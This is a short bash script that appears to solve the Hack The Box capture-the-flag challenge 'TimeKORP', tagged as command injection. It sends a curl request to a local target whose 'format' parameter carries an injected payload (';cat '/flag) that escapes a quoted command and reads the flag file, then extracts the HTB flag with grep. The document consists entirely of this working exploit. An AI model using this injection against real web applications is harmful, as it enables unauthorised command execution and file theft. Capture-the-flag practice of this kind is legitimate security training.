#!/bin/bash
# https://app.hackthebox.com/challenges/TimeKORP
# Tags: Command Injection

TARGET=127.0.0.1:1337
FLAG=$(curl -s "http://$TARGET?format=';cat%20'/flag" | grep -oP 'HTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
